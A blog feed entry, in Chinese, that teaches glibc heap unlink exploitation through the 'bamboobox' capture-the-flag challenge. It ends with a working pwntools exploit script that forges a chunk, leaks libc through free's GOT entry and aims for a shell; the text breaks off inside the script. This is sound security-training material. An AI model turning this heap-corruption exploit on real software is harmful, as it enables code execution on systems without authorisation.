{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"unlink\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/08/11/unlink/",
            "url": "http://example.com/2023/08/11/unlink/",
            "title": "unlink",
            "date_published": "2023-08-11T05:56:52.000Z",
            "content_html": "<h1 id=\"pwn_unlink了解学习\"><a class=\"markdownIt-Anchor\" href=\"#pwn_unlink了解学习\">#</a> PWN_unlink 了解学习</h1>\n<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理：</h2>\n<p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>\n<p><em>注意这里的是修改指针</em></p>\n<p>简单的介绍下 unlink，其实 ctfwiki 有介绍，这里简单介绍下：</p>\n<pre><code>1. 首先找到要进行unlink的chunk(这里记为P)的前后堆块，\n   FD = P-&gt;fd, BK = P-&gt;bk。\n\t\n2. 进行安全检查，glibc2.23的潦草判断条件如下\n   FD-&gt;bk == P, BK-&gt;fd == P。\n   \n3. 然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。\n\n4. 当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink\n</code></pre>\n<p>这里就是我们需要构造 fake_chunk 去绕过检查，利用 unlink 漏洞，去达到我们想要达成的效果。</p>\n<ul>\n<li>利用 pwn unlink 漏洞可以实现以下攻击：</li>\n</ul>\n<ol>\n<li><strong>泄露内存</strong>：通过 unlink 漏洞，可以将两个相邻的堆块合并，导致一个已经释放的堆块中的指针被篡改。通过修改指针的值，可以泄露堆中的敏感信息，如函数指针、堆块头部数据等。</li>\n<li><strong>任意内存写</strong>：通过 unlink 漏洞，可以修改已经释放的堆块的前后指针，从而实现任意内存写。这可以用来修改关键数据结构，如堆块头部、全局变量等，进而控制程序的执行流程。</li>\n<li><strong>执行任意代码</strong>：通过泄露函数指针或修改返回地址等方式，可以篡改程序的控制流，从而实现代码执行。这可以用来执行恶意代码、获取系统权限等。</li>\n</ol>\n<blockquote>\n<p><img data-src=\"/img/unlinkpic/unlink_smallbin_intro.png\" alt=\"img\"></p>\n</blockquote>\n<blockquote>\n<p>利用思路 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18y\">¶</span></p>\n<p>条件 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18z\">¶</span></p>\n<ol>\n<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>\n<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>\n</ol>\n<p>效果 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI180\">¶</span></p>\n<p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>\n<p>思路 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI181\">¶</span></p>\n<p>设指向可 UAF chunk 的指针的地址为 ptr</p>\n<ol>\n<li>修改 fd 为 ptr - 0x18</li>\n<li>修改 bk 为 ptr - 0x10</li>\n<li>触发 unlink</li>\n</ol>\n<p>ptr 处的指针会变为 ptr - 0x18。</p>\n<p>光讲原理，很枯燥乏味。上个题目，提提兴趣。</p>\n</blockquote>\n<h3 id=\"题目来源\"><a class=\"markdownIt-Anchor\" href=\"#题目来源\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2hpdGNvbnRyYWluaW5nX3VubGluaw==\">题目来源：</span></h3>\n<h6 id=\"例行检查\"><a class=\"markdownIt-Anchor\" href=\"#例行检查\">#</a> 例行检查：</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115628259.png\" alt=\"image-20230811115628259\"></p>\n<h6 id=\"执行程序\"><a class=\"markdownIt-Anchor\" href=\"#执行程序\">#</a> 执行程序：</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115714589.png\" alt=\"image-20230811115714589\"></p>\n<blockquote>\n<p>给了个菜单，一共 5 个 node。这里就不一一执行了。</p>\n</blockquote>\n<h6 id=\"ida看源代码\"><a class=\"markdownIt-Anchor\" href=\"#ida看源代码\">#</a> IDA 看源代码：</h6>\n<ul>\n<li>main:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811115907614.png\" alt=\"image-20230811115907614\"></p>\n<blockquote>\n<p>可以看到很多函数。这里简单讲一下吧。程序首先申请了 0x10 字节大小的堆空间。并将返回的指针赋予 v4 变量。将 v4 [0] 的函数指针指向 hello_message 内容，v4 [1] 的函数指针指向 goodbye_message 的内容。然后开头打印 v4 [0] 指向的内容。接着进行循环，每循环一次都会调用 menu 函数，并且输入一个不长于 8 字节的数字，然后将输入的数字转换成整数进行 switch 匹配。</p>\n</blockquote>\n<ul>\n<li>add_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811121510474.png\" alt=\"image-20230811121510474\"></p>\n<blockquote>\n<p>add 要求输入大小和内容。在这里可以很明显的发现一块 bss 段地址。因为 bss 段可以任意读写，所以可以通过 unlink 漏洞在 bss 段写入 got 地址，从而可以泄露 libc 地址</p>\n</blockquote>\n<ul>\n<li>remove_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811124741272.png\" alt=\"image-20230811124741272\"></p>\n<blockquote>\n<p>不存在 uaf 漏洞，但是可以利用 free 一个非 fastbins 大小的 chunk，去触发 unlink 漏洞。</p>\n</blockquote>\n<ul>\n<li>\n<p>change_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811124946810.png\" alt=\"image-20230811124946810\"></p>\n</li>\n</ul>\n<blockquote>\n<p>注释即使重点！</p>\n</blockquote>\n<ul>\n<li>\n<p>show_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811125058481.png\" alt=\"image-20230811125058481\"></p>\n</li>\n</ul>\n<blockquote>\n<p>利用这里的输出，可以去打印处 libc 地址</p>\n</blockquote>\n<h6 id=\"exp构造过程\"><a class=\"markdownIt-Anchor\" href=\"#exp构造过程\">#</a> exp 构造过程：</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>首先 make chunk。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span><span class=\"token comment\">#指向 itemlist 内容</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token comment\">#堆溢出，改写 chunk1 的头，为后续 unlink 触发。</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#触发 unlink, 使 chunk0 指向 itemlist 内容</span></pre></td></tr></table></figure><p>接下来就是泄露 libc，然后去覆盖 got 地址。执行 shell 函数。</p>\n<h6 id=\"最终的exp\"><a class=\"markdownIt-Anchor\" href=\"#最终的exp\">#</a> 最终的 exp：</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># r = remote('node4.buuoj.cn',25461)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./bamboobox')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_item</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the name of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the new name of the item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>free_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_got:%x\"</span><span class=\"token punctuation\">,</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>free_addr<span class=\"token operator\">=</span>lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_addr:%x\"</span><span class=\"token operator\">%</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>libc_base<span class=\"token operator\">=</span>free_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 